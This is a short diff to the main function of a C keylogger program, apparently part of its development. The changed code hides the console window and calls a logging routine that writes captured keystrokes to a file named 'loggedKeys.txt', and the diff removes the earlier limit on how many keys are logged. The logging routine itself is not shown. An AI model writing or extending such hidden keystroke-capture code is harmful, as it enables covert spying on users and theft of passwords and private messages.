@@ -1,12 +1,18 @@
+#include <stdio.h>
+
 #include "keyLogger.h"
 
-#define OUTPUT_FILE_NAME "keys.txt"
+#define OUTPUT_FILE_NAME "loggedKeys.txt"
 
 
-errno_t main(void)
+const errno_t main(void)
 {
     hideConsoleWindow();
-    size_t const maximumKeys = 20; // Change as needed
 
-    return logKeys(OUTPUT_FILE_NAME, maximumKeys);
+    errno_t err = logKeys(OUTPUT_FILE_NAME);
+    if (err) return err;
+
+    return 0;
 }
+
+
